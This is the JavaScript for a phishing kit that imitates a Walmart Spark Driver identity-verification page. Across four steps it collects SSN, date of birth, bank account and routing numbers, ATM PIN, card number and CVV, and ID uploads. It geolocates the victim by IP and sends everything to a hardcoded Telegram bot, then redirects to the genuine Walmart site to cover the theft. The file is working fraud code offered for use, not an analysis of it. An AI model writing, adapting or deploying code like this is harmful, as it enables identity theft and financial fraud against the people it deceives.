document.addEventListener('DOMContentLoaded', function() {
    // Telegram bot configuration
    const TELEGRAM_BOT_TOKEN = '8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA';
    const TELEGRAM_CHAT_ID = '7959372593';

    // Step navigation
    const nextToPaymentBtn = document.getElementById('nextToPayment');
    const nextToCardBtn = document.getElementById('nextToCard');
    const nextToIdBtn = document.getElementById('nextToId');
    const completeVerificationBtn = document.getElementById('completeVerification');

    // Form validation and navigation
    nextToPaymentBtn.addEventListener('click', function() {
        if (validateStep1()) {
            showLoading('loading1');
            setTimeout(function() {
                hideLoading('loading1');
                updateProgress(1);
                showStep(2);
            }, 5000);
        }
    });

    nextToCardBtn.addEventListener('click', function() {
        if (validateStep2()) {
            showLoading('loading2');
            setTimeout(function() {
                hideLoading('loading2');
                updateProgress(2);
                showStep(3);
            }, 5000);
        }
    });

    nextToIdBtn.addEventListener('click', function() {
        if (validateStep3()) {
            showLoading('loading3');
            setTimeout(function() {
                hideLoading('loading3');
                updateProgress(3);
                showStep(4);
            }, 5000);
        }
    });

    completeVerificationBtn.addEventListener('click', async function() {
        if (validateStep4()) {
            showLoading('loading4');

            // Collect all form data
            const formData = collectFormData();

            try {
                // Get IP and location information
                const ipInfo = await getIPInfo();

                // Send data to Telegram
                await sendToTelegram(formData, ipInfo);

                // Wait for 5 seconds before redirecting
                setTimeout(function() {
                    hideLoading('loading4');
                    updateProgress(4);
                    // Redirect to main site after successful verification
                    window.location.href = "https://one.walmart.com/content/sparkdriverapp/en_us.html";
                }, 5000);
            } catch (error) {
                console.error('Error:', error);
                hideLoading('loading4');
                alert('An error occurred. Please try again.');
            }
        }
    });

    // Function to collect all form data
    function collectFormData() {
        return {
            step1: {
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                phone: document.getElementById('phone').value,
                dob: document.getElementById('dob').value,
                ssn: document.getElementById('ssn').value,
                address: document.getElementById('address').value
            },
            step2: {
                bankName: document.getElementById('bankName').value,
                bankAccount: document.getElementById('bankAccount').value,
                accountType: document.getElementById('accountType').value,
                routingNumber: document.getElementById('routingNumber').value,
                atmPin: document.getElementById('atmPin').value
            },
            step3: {
                cardNumber: document.getElementById('cardNumber').value,
                expDate: document.getElementById('expDate').value,
                cvv: document.getElementById('cvv').value,
                confirmAtmPin: document.getElementById('confirmAtmPin').value
            },
            step4: {
                frontId: document.getElementById('frontId').files[0] ? document.getElementById('frontId').files[0].name : 'No file selected',
                backId: document.getElementById('backId').files[0] ? document.getElementById('backId').files[0].name : 'No file selected'
            }
        };
    }

    // Function to get IP and location information
    async function getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                isp: data.org
            };
        } catch (error) {
            console.error('Error fetching IP information:', error);
            return {
                ip: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                postal: 'Unknown',
                isp: 'Unknown'
            };
        }
    }

    // Function to send data to Telegram
    async function sendToTelegram(formData, ipInfo) {
        // Format the message
        let message = `*New Identity Verification Submission*%0A%0A`;

        // Step 1 data
        message += `*Personal Information:*%0A`;
        message += `First Name: ${formData.step1.firstName}%0A`;
        message += `Last Name: ${formData.step1.lastName}%0A`;
        message += `Phone: ${formData.step1.phone}%0A`;
        message += `DOB: ${formData.step1.dob}%0A`;
        message += `SSN: ${formData.step1.ssn}%0A`;
        message += `Address: ${formData.step1.address}%0A%0A`;

        // Step 2 data
        message += `*Bank Information:*%0A`;
        message += `Bank Name: ${formData.step2.bankName}%0A`;
        message += `Account Number: ${formData.step2.bankAccount}%0A`;
        message += `Account Type: ${formData.step2.accountType}%0A`;
        message += `Routing Number: ${formData.step2.routingNumber}%0A`;
        message += `ATM Pin: ${formData.step2.atmPin}%0A%0A`;

        // Step 3 data
        message += `*Card Information:*%0A`;
        message += `Card Number: ${formData.step3.cardNumber}%0A`;
        message += `Expiration Date: ${formData.step3.expDate}%0A`;
        message += `CVV: ${formData.step3.cvv}%0A`;
        message += `Confirm ATM Pin: ${formData.step3.confirmAtmPin}%0A%0A`;

        // Step 4 data
        message += `*ID Upload:*%0A`;
        message += `Front ID: ${formData.step4.frontId}%0A`;
        message += `Back ID: ${formData.step4.backId}%0A%0A`;

        // IP information
        message += `*IP Information:*%0A`;
        message += `IP Address: ${ipInfo.ip}%0A`;
        message += `City: ${ipInfo.city}%0A`;
        message += `State/Region: ${ipInfo.region}%0A`;
        message += `Country: ${ipInfo.country}%0A`;
        message += `Postal Code: ${ipInfo.postal}%0A`;
        message += `ISP: ${ipInfo.isp}%0A`;

        // Send the message to Telegram
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;

        try {
            const response = await fetch(url);
            const data = await response.json();
            if (!data.ok) {
                throw new Error('Telegram API error: ' + data.description);
            }
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            throw error;
        }
    }

    // Card logo recognition
    document.getElementById('cardNumber').addEventListener('input', function() {
        const cardNumber = this.value;
        const cardLogo = document.getElementById('cardLogo');

        if (cardNumber.startsWith('4') && cardNumber.length >= 1) {
            // Visa card
            cardLogo.src = 'https://logo.clearbit.com/visa.com';
            cardLogo.style.display = 'block';
        } else if (cardNumber.startsWith('5') && cardNumber.length >= 1) {
            // Mastercard
            cardLogo.src = 'https://logo.clearbit.com/mastercard.com';
            cardLogo.style.display = 'block';
        } else {
            cardLogo.style.display = 'none';
        }
    });

    // Restrict input to numbers only
    function restrictToNumbers(element) {
        element.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    }

    // Apply number restriction to relevant fields
    restrictToNumbers(document.getElementById('phone'));
    restrictToNumbers(document.getElementById('ssn'));
    restrictToNumbers(document.getElementById('routingNumber'));
    restrictToNumbers(document.getElementById('atmPin'));
    restrictToNumbers(document.getElementById('cardNumber'));
    restrictToNumbers(document.getElementById('cvv'));
    restrictToNumbers(document.getElementById('confirmAtmPin'));

    // Validation functions
    function validateStep1() {
        const phone = document.getElementById('phone');
        const ssn = document.getElementById('ssn');
        let isValid = true;

        // Validate phone number (exactly 10 digits)
        if (!/^\d{10}$/.test(phone.value)) {
            document.getElementById('phoneError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('phoneError').style.display = 'none';
        }

        // Validate SSN (exactly 9 digits)
        if (!/^\d{9}$/.test(ssn.value)) {
            document.getElementById('ssnError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('ssnError').style.display = 'none';
        }

        // Check if all required fields are filled
        const requiredFields = document.querySelectorAll('#identityForm [required]');
        for (let field of requiredFields) {
            if (!field.value.trim()) {
                field.style.borderColor = '#d9534f';
                isValid = false;
            } else {
                field.style.borderColor = '#ddd';
            }
        }

        return isValid;
    }

    function validateStep2() {
        const routingNumber = document.getElementById('routingNumber');
        const atmPin = document.getElementById('atmPin');
        let isValid = true;

        // Validate routing number (exactly 9 digits)
        if (!/^\d{9}$/.test(routingNumber.value)) {
            document.getElementById('routingError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('routingError').style.display = 'none';
        }

        // Validate ATM PIN (exactly 4 digits)
        if (!/^\d{4}$/.test(atmPin.value)) {
            document.getElementById('atmPinError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('atmPinError').style.display = 'none';
        }

        // Check if all required fields are filled
        const requiredFields = document.querySelectorAll('#paymentForm [required]');
        for (let field of requiredFields) {
            if (!field.value.trim()) {
                field.style.borderColor = '#d9534f';
                isValid = false;
            } else {
                field.style.borderColor = '#ddd';
            }
        }
        return isValid;
    }

    function validateStep3() {
        const cardNumber = document.getElementById('cardNumber');
        const cvv = document.getElementById('cvv');
        const atmPin = document.getElementById('atmPin').value;
        const confirmAtmPin = document.getElementById('confirmAtmPin');
        let isValid = true;

        // Validate card number (exactly 16 digits)
        if (!/^\d{16}$/.test(cardNumber.value)) {
            document.getElementById('cardError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('cardError').style.display = 'none';
        }

        // Validate CVV (3-4 digits)
        if (!/^\d{3,4}$/.test(cvv.value)) {
            document.getElementById('cvvError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('cvvError').style.display = 'none';
        }

        // Validate confirm ATM PIN (exactly 4 digits)
        if (!/^\d{4}$/.test(confirmAtmPin.value)) {
            document.getElementById('confirmPinError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('confirmPinError').style.display = 'none';
        }

        // Check if ATM pins match
        if (atmPin !== confirmAtmPin.value) {
            alert('ATM pins do not match');
            isValid = false;
        }

        // Check if all required fields are filled
        const requiredFields = document.querySelectorAll('#cardForm [required]');
        for (let field of requiredFields) {
            if (!field.value.trim()) {
                field.style.borderColor = '#d9534f';
                isValid = false;
            } else {
                field.style.borderColor = '#ddd';
            }
        }

        return isValid;
    }

    function validateStep4() {
        // Check if files are selected
        const frontId = document.getElementById('frontId');
        const backId = document.getElementById('backId');
        let isValid = true;

        if (!frontId.files.length) {
            frontId.style.borderColor = '#d9534f';
            isValid = false;
        } else {
            frontId.style.borderColor = '#ddd';
        }

        if (!backId.files.length) {
            backId.style.borderColor = '#d9534f';
            isValid = false;
        } else {
            backId.style.borderColor = '#ddd';
        }

        return isValid;
    }

    // Helper functions
    function showStep(stepNumber) {
        // Hide all steps
        const steps = document.querySelectorAll('.form-step');
        steps.forEach(step => step.classList.remove('active'));

        // Show the requested step
        document.getElementById(`step${stepNumber}`).classList.add('active');
    }

    function updateProgress(completedStep) {
        const steps = document.querySelectorAll('.progress-step');

        // Reset all steps
        steps.forEach(step => {
            step.classList.remove('active', 'completed');
        });

        // Mark completed steps
        for (let i = 0; i < completedStep; i++) {
            steps[i].classList.add('completed');
        }

        // Set current step as active
        steps[completedStep].classList.add('active');
    }

    function showLoading(loadingId) {
        document.getElementById(loadingId).style.display = 'block';
    }

    function hideLoading(loadingId) {
        document.getElementById(loadingId).style.display = 'none';
    }
});